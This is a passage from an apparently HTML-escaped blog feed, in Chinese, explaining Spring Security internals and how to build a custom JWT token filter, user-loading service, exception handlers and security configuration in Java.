&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>authenticationTrustResolver&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isAnonymous&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> authenticationTrustResolver&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isRememberMe&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;Access is denied (user is &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">(&lt;/span>authenticationTrustResolver&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isAnonymous&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#e6db74">&amp;#34;anonymous&amp;#34;&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;not fully authenticated&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;); redirecting to authentication entry point&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
exception&lt;span style="color:#f92672">);&lt;/span>
sendStartAuthentication&lt;span style="color:#f92672">(&lt;/span>
request&lt;span style="color:#f92672">,&lt;/span>
response&lt;span style="color:#f92672">,&lt;/span>
chain&lt;span style="color:#f92672">,&lt;/span>
&lt;span style="color:#66d9ef">new&lt;/span> InsufficientAuthenticationException&lt;span style="color:#f92672">(&lt;/span>
messages&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getMessage&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;ExceptionTranslationFilter.insufficientAuthentication&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;Full authentication is required to access this resource&amp;#34;&lt;/span>&lt;span style="color:#f92672">)));&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#66d9ef">else&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
logger&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">debug&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;Access is denied (user is not anonymous); delegating to AccessDeniedHandler&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
exception&lt;span style="color:#f92672">);&lt;/span>
accessDeniedHandler&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span>
&lt;span style="color:#f92672">(&lt;/span>AccessDeniedException&lt;span style="color:#f92672">)&lt;/span> exception&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#a6e22e">@RestControllerAdvice&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">GlobalExceptionHandler&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> AuthenticationEntryPoint&lt;span style="color:#f92672">,&lt;/span> AccessDeniedHandler &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">commence&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpServletRequest httpServletRequest&lt;span style="color:#f92672">,&lt;/span> HttpServletResponse httpServletResponse&lt;span style="color:#f92672">,&lt;/span> AuthenticationException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException &lt;span style="color:#f92672">{&lt;/span>
log&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">error&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;spring security 认证发生异常。&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> e&lt;span style="color:#f92672">);&lt;/span>
HttpResponseWriter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sendError&lt;/span>&lt;span style="color:#f92672">(&lt;/span>httpServletResponse&lt;span style="color:#f92672">,&lt;/span> HttpServletResponse&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">SC_UNAUTHORIZED&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;身份认证失败&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpServletRequest httpServletRequest&lt;span style="color:#f92672">,&lt;/span> HttpServletResponse httpServletResponse&lt;span style="color:#f92672">,&lt;/span> AccessDeniedException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException &lt;span style="color:#f92672">{&lt;/span>
log&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">error&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;spring security 鉴权发生异常。&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> e&lt;span style="color:#f92672">);&lt;/span>
HttpResponseWriter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sendError&lt;/span>&lt;span style="color:#f92672">(&lt;/span>httpServletResponse&lt;span style="color:#f92672">,&lt;/span> HttpServletResponse&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">SC_FORBIDDEN&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;鉴权失败&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="uml-diagram">Uml Diagram&lt;/h2>
&lt;p>权限验证和身份验证的架构设计类似，大量运用了模板方法设计模式和组合的设计思路，使得各项模块都具备高度配置化。每个类都只履行自己的职责，其余的任务都委托给关联的其他类来执行。&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/mikumikulch/pictures/master/springsecurity2.png" alt="">&lt;/p></description></item><item><title>Spring security 自定义 token 身份验证</title><link>https://www.chucklin.net/post/springsecurity_authentication2/</link><pubDate>Sat, 03 Apr 2021 10:52:00 +0800</pubDate><guid>https://www.chucklin.net/post/springsecurity_authentication2/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
&lt;p>既然 Spring securtiy 的核心是 Filter chains，那我们只需要定义一个符合 security 标准的 filter ，再把自己的 chain 加入到 VirtualFilterChain 里面，就可以自定义身份验证的认证逻辑了。&lt;/p>
&lt;p>之前提到过，大部分身份认证相关的过滤器都继承了 AbstractAuthenticationProcessingFilter。但是这一次我们让接下来的自定义过滤器不选择继承它，而是继承 OncePerRequestFilter。&lt;/p>
&lt;p>这个类之前我们没有见过，其实它也是 security 框架提供的一个 VirtualFilter 父类。继承一个陌生的类听起来有点吓人，不过很快你就知道 AbstractAuthenticationProcessingFilter 也好，OncePerRequestFilter 也罢，都是 filter 而已。&lt;/p>
&lt;h2 id="自定义一个-filter">自定义一个 Filter&lt;/h2>
&lt;p>我们参照 security 的基础身份认证过滤器 UsernamePasswordAuthenticationFilter 来编写我们的过滤器。这是不是意味着我们也必须使用模板设计模式来编写自定义过滤器的父类，然后聚合 providerManager 再自定义 provider 实现一整套 security 范式的身份认证代码？&lt;/p>
&lt;p>不是的，你完全可以把 provider 的逻辑全部抽离出来加入到你的自定义过滤器里面。实际上我的过滤器一共就三个逻辑。非常简单并且可以工作的很好！&lt;/p>
&lt;ol>
&lt;li>通过确认 token 的有效性来验证请求的身份。类似于 DaoAuthenticationProvider.additionalAuthenticationChecks。&lt;/li>
&lt;li>从数据库检索出用户的详情，方便后续取用。类似于 DaoAuthenticationProvider. retrieveUser()。&lt;/li>
&lt;li>将验证通过的身份资产（principal）封装到 UsernamePasswordAuthenticationToken，并设置到 security context。类似于 AbstractAuthenticationProcessingFilter.successfulAuthentication。&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">doFilterInternal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpServletRequest request&lt;span style="color:#f92672">,&lt;/span>
HttpServletResponse response&lt;span style="color:#f92672">,&lt;/span>
FilterChain chain&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">throws&lt;/span> ServletException&lt;span style="color:#f92672">,&lt;/span> IOException &lt;span style="color:#f92672">{&lt;/span>
String header &lt;span style="color:#f92672">=&lt;/span> request&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getHeader&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpHeaders&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">AUTHORIZATION&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>StringUtils&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isEmpty&lt;/span>&lt;span style="color:#f92672">(&lt;/span>header&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>header&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">startsWith&lt;/span>&lt;span style="color:#f92672">(&lt;/span>BEARER_SPACE&lt;span style="color:#f92672">))&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
globalExceptionHandler&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">commence&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> AuthenticationException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;非法的 token 请求参数&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#f92672">});&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
String token &lt;span style="color:#f92672">=&lt;/span> header&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">split&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34; &amp;#34;&lt;/span>&lt;span style="color:#f92672">)[&lt;/span>1&lt;span style="color:#f92672">].&lt;/span>&lt;span style="color:#a6e22e">trim&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#66d9ef">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
TokenUtil&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">verifyToken&lt;/span>&lt;span style="color:#f92672">(&lt;/span>token&lt;span style="color:#f92672">,&lt;/span> base64Secret&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#66d9ef">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>FoundationAppException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
globalExceptionHandler&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">commence&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> AuthenticationException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;非法的 token&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#f92672">});&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">// 返回 401
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// jwt 认证通过即代表认证成功。将 principal 资源装配到 context
&lt;/span>&lt;span style="color:#75715e">&lt;/span> UserDetails userDetails &lt;span style="color:#f92672">=&lt;/span> userAppService&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">loadUserByUsername&lt;/span>&lt;span style="color:#f92672">(&lt;/span>TokenUtil&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getUsername&lt;/span>&lt;span style="color:#f92672">(&lt;/span>token&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;@&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> TokenUtil&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getDomain&lt;/span>&lt;span style="color:#f92672">(&lt;/span>token&lt;span style="color:#f92672">));&lt;/span>
UsernamePasswordAuthenticationToken
authentication &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> UsernamePasswordAuthenticationToken&lt;span style="color:#f92672">(&lt;/span>
userDetails&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
userDetails&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getAuthorities&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>userDetails&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">isEnabled&lt;/span>&lt;span style="color:#f92672">())&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
globalExceptionHandler&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">commence&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> DisabledException&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;当前账户已锁定&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
authentication&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">setDetails&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#66d9ef">new&lt;/span> WebAuthenticationDetailsSource&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">buildDetails&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">);&lt;/span>
SecurityContextHolder&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">getContext&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#a6e22e">setAuthentication&lt;/span>&lt;span style="color:#f92672">(&lt;/span>authentication&lt;span style="color:#f92672">);&lt;/span>
chain&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">doFilter&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="实现-loadbyusername">实现 loadByUsername&lt;/h2>
&lt;p>让我们的任何一个类——我建议是和 user 相关处理的 service 类实现 UserDetailsService 接口，就可以重写 loadByUsername 方法了。
实现这个接口很重要，因为他定义了 UserDetails 接口——这个你的用户对象应该遵守的规范和行为。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> UserDetails &lt;span style="color:#a6e22e">loadUserByUsername&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String name&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> UsernameNotFoundException &lt;span style="color:#f92672">{&lt;/span>
String&lt;span style="color:#f92672">[]&lt;/span> split &lt;span style="color:#f92672">=&lt;/span> name&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">split&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;@&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
String username &lt;span style="color:#f92672">=&lt;/span> split&lt;span style="color:#f92672">[&lt;/span>0&lt;span style="color:#f92672">];&lt;/span>
String domainCode &lt;span style="color:#f92672">=&lt;/span> split&lt;span style="color:#f92672">[&lt;/span>1&lt;span style="color:#f92672">];&lt;/span>
Domain domain &lt;span style="color:#f92672">=&lt;/span> domainRepository&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">findByCode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>domainCode&lt;span style="color:#f92672">).&lt;/span>&lt;span style="color:#a6e22e">orElseThrow&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> UsernameNotFoundException&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">format&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;User with domain - %s, not found&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> domainCode&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#f92672">);&lt;/span>
AuthUser user &lt;span style="color:#f92672">=&lt;/span> authUserRepository
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">findByDomainAndUsername&lt;/span>&lt;span style="color:#f92672">(&lt;/span>domain&lt;span style="color:#f92672">,&lt;/span> username&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">orElseThrow&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> UsernameNotFoundException&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">format&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;User with username and domain - %s, not found&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> name&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> user&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="考虑一下异常处理">考虑一下异常处理&lt;/h2>
&lt;p>自定义 token 过滤器的工作这就基本完成了。不过健壮的处理程序，往往都伴随着异常逻辑的完美捕获。回忆之前的内容，filter 的异常处理都是通过端点处理程序——AuthenticationEntryPointFailureHandler 来处理的。所以只要我们自定义端点处理程序并重写 commence 方法就完全可以达到一样的效果。&lt;/p>
&lt;p>&lt;strong>AuthenticationEntryPointFailureHandler&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">onAuthenticationFailure&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpServletRequest request&lt;span style="color:#f92672">,&lt;/span> HttpServletResponse response&lt;span style="color:#f92672">,&lt;/span>
AuthenticationException exception&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException&lt;span style="color:#f92672">,&lt;/span> ServletException &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">authenticationEntryPoint&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">commence&lt;/span>&lt;span style="color:#f92672">(&lt;/span>request&lt;span style="color:#f92672">,&lt;/span> response&lt;span style="color:#f92672">,&lt;/span> exception&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;strong>自定义异常处理程序&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java"> &lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">commence&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpServletRequest httpServletRequest&lt;span style="color:#f92672">,&lt;/span> HttpServletResponse httpServletResponse&lt;span style="color:#f92672">,&lt;/span> AuthenticationException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException &lt;span style="color:#f92672">{&lt;/span>
log&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">error&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;spring security 认证发生异常。&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> e&lt;span style="color:#f92672">);&lt;/span>
HttpResponseWriter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sendError&lt;/span>&lt;span style="color:#f92672">(&lt;/span>httpServletResponse&lt;span style="color:#f92672">,&lt;/span> HttpServletResponse&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">SC_UNAUTHORIZED&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;身份认证失败&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">handle&lt;/span>&lt;span style="color:#f92672">(&lt;/span>HttpServletRequest httpServletRequest&lt;span style="color:#f92672">,&lt;/span> HttpServletResponse httpServletResponse&lt;span style="color:#f92672">,&lt;/span> AccessDeniedException e&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> IOException &lt;span style="color:#f92672">{&lt;/span>
log&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">error&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;spring security 鉴权发生异常。&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> e&lt;span style="color:#f92672">);&lt;/span>
HttpResponseWriter&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sendError&lt;/span>&lt;span style="color:#f92672">(&lt;/span>httpServletResponse&lt;span style="color:#f92672">,&lt;/span> HttpServletResponse&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">SC_FORBIDDEN&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#e6db74">&amp;#34;鉴权失败&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="将自定义内容装配进-security-架构">将自定义内容装配进 security 架构&lt;/h2>
&lt;p>要想我们的过滤器先一步生效，需要将过滤器加入到 security 自带的认证过滤器之前；接着还需要把自定义异常配置到异常处理流程中。是的，就这些工作内容，没有更多了。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#a6e22e">@EnableWebSecurity&lt;/span>
&lt;span style="color:#a6e22e">@EnableGlobalMethodSecurity&lt;/span>&lt;span style="color:#f92672">(&lt;/span>prePostEnabled &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">,&lt;/span> securedEnabled &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">SecurityConfig&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> WebSecurityConfigurerAdapter &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#a6e22e">@Autowired&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> UserAppService userAppService&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#a6e22e">@Autowired&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> JwtTokenFilter jwtTokenFilter&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#a6e22e">@Autowired&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> GlobalExceptionHandler globalExceptionHandler&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 配置密码加密装置
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#a6e22e">@Bean&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> PasswordEncoder &lt;span style="color:#a6e22e">passwordEncoder&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> BCryptPasswordEncoder&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 配置 Dao Authenticationprovider 协调器
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">configure&lt;/span>&lt;span style="color:#f92672">(&lt;/span>AuthenticationManagerBuilder auth&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#66d9ef">throws&lt;/span> Exception &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">// configure authentication manager
&lt;/span>&lt;span style="color:#75715e">&lt;/span> auth&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">userDetailsService&lt;/span>&lt;span style="color:#f92672">(&lt;/span>userAppService&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">configure&lt;/span>&lt;span style="color:#f92672">(&lt;/span>WebSecurity web&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
web&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">ignoring&lt;/span>&lt;span style="color:#f92672">()&lt;/span>
